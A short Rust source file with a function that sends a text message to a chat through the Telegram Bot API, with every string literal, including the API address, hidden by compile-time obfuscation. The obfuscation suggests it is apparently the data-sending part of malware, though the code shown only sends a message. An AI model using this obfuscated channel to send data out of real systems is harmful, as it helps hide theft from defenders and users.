use ureq;
use obfstr::obfstr;

pub fn bot(text:String,token:String,userid:String,mode:String)->bool
{
let uri = format!("{}{}{}",obfstr!("https://api.telegram.org/bot"),token,obfstr!("/sendMessage"));

   match ureq::post(&uri).send_form(&[(obfstr!("chat_id"),&userid),(obfstr!("text"),&text),(obfstr!("parse_mode"),&mode)])
   {
    Ok(_n)  => return true,
    Err(_e) => return false
   };
}